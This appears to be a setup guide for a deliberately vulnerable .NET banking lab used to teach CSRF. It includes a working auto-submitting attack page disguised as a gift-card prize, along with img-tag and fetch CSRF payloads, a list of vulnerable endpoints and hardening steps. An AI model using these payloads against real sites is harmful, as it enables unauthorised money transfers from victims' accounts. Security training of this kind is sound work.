# Local Deployment Guide - Lab 04: .NET Core Banking Application

## Quick Start with .NET CLI (Recommended)

The fastest way to get the lab running:

```bash
cd labs/lab-04-dotnet-banking/src/SecureBankingApp
dotnet restore
dotnet ef database update
dotnet run
```

The application will be available at:
- **HTTP**: http://localhost:5000
- **HTTPS**: https://localhost:5001

## Prerequisites

- .NET 8.0 SDK
- SQL Server LocalDB (included with Visual Studio) or SQL Server Express
- Visual Studio 2022 or VS Code with C# extension

## Step-by-Step Setup

### 1. Install .NET SDK

Download and install .NET 8.0 SDK from https://dotnet.microsoft.com/download

Verify installation:
```bash
dotnet --version
```

### 2. Restore Dependencies

```bash
cd labs/lab-04-dotnet-banking/src/SecureBankingApp
dotnet restore
```

### 3. Setup Database

The application uses SQL Server LocalDB by default. To initialize:

```bash
# Create and apply migrations
dotnet ef migrations add InitialCreate
dotnet ef database update
```

If you encounter database issues, try:
```bash
# Reset database
dotnet ef database drop --force
dotnet ef migrations remove
dotnet ef migrations add InitialCreate
dotnet ef database update
```

### 4. Run the Application

```bash
dotnet run
```

Or with hot reload for development:
```bash
dotnet watch run
```

## Default Accounts

The application automatically creates test accounts on first run:

### Admin Account
- **Email**: admin@securebank.com
- **Password**: Admin123!
- **Account**: ADMIN001 (Balance: $100,000)

### User Account  
- **Email**: user@securebank.com
- **Password**: User123!
- **Account**: USER001 (Balance: $2,500)

## Testing CSRF Vulnerabilities

### 1. Login and Transfer Money

1. Visit http://localhost:5000
2. Login with user credentials
3. Go to Transfer Money page
4. Note the form lacks anti-forgery tokens

### 2. Create CSRF Attack Page

Create `csrf-attack.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Free $100 Gift Card!</title>
</head>
<body>
    <h1>Congratulations! You've won!</h1>
    <p>Click below to claim your $100 gift card:</p>
    
    <!-- CSRF Attack Form -->
    <form action="http://localhost:5000/Transfer/Send" method="post" id="csrfForm">
        <input type="hidden" name="FromAccountNumber" value="USER001" />
        <input type="hidden" name="ToAccountNumber" value="ADMIN001" />
        <input type="hidden" name="Amount" value="500" />
        <input type="hidden" name="Description" value="Gift card fee" />
        <input type="submit" value="Claim Your Gift Card!" 
               style="background: green; color: white; padding: 10px 20px; border: none; cursor: pointer;" />
    </form>
    
    <!-- Auto-submit after 2 seconds -->
    <script>
        setTimeout(() => {
            document.getElementById('csrfForm').submit();
        }, 2000);
    </script>
</body>
</html>
```

### 3. Test the Attack

1. Make sure you're logged into the banking app
2. Open `csrf-attack.html` in your browser
3. The form will auto-submit and transfer money

### 4. Additional CSRF Tests

**GET-based CSRF** (if vulnerable endpoints exist):
```html
<img src="http://localhost:5000/Admin/FreezeAccount?accountId=1" />
```

**JSON CSRF** for API endpoints:
```javascript
fetch('http://localhost:5000/Transfer/QuickTransfer', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'amount=100&toAccount=EVIL123'
});
```

## Troubleshooting

### Database Connection Issues

If you get database connection errors:

```bash
# Check LocalDB status
sqllocaldb info
sqllocaldb start MSSQLLocalDB

# Or use SQL Server Express connection string
# Update appsettings.json with your SQL Server connection string
```

### Port Already in Use

```bash
# Kill process using port 5000
lsof -ti:5000 | xargs kill -9  # macOS/Linux
netstat -ano | findstr :5000   # Windows
```

### Migration Issues

```bash
# Clear all migrations and restart
rm -rf Migrations/
dotnet ef migrations add InitialCreate
dotnet ef database update
```

## Docker Deployment (Alternative)

```bash
cd labs/lab-04-dotnet-banking
docker build -t banking-app .
docker run -p 5000:5000 banking-app
```

## Security Analysis

### Vulnerable Endpoints

1. **POST /Transfer/Send** - No CSRF protection
2. **POST /Account/UpdateProfile** - Missing anti-forgery validation  
3. **POST /Admin/CreateAccount** - Administrative CSRF
4. **POST /Transfer/QuickTransfer** - JSON API CSRF

### Code Review Points

Look for these security issues:
- Missing `[ValidateAntiForgeryToken]` attributes
- Forms without `@Html.AntiForgeryToken()`
- Permissive CORS settings
- Weak cookie configuration
- Debug mode in production

### Testing Tools

- **Burp Suite**: Professional web security testing
- **OWASP ZAP**: Free security testing proxy
- **Browser DevTools**: Inspect requests/responses
- **Postman**: API testing and manipulation

## Production Hardening

To secure this application:

1. Add `[ValidateAntiForgeryToken]` to all POST actions
2. Include `@Html.AntiForgeryToken()` in all forms
3. Configure secure cookie settings
4. Enable HTTPS redirection
5. Implement proper CORS policies
6. Add security headers
7. Enable request validation
8. Implement rate limiting

## Log Analysis

Application logs show CSRF attacks:
```
[CSRF VULNERABILITY: Transfer initiated without anti-forgery token validation]
[CSRF ATTACK SUCCESSFUL: Transfer of $500.00 completed from USER001 to ADMIN001]
```

Monitor these logs to detect attack attempts in real applications.
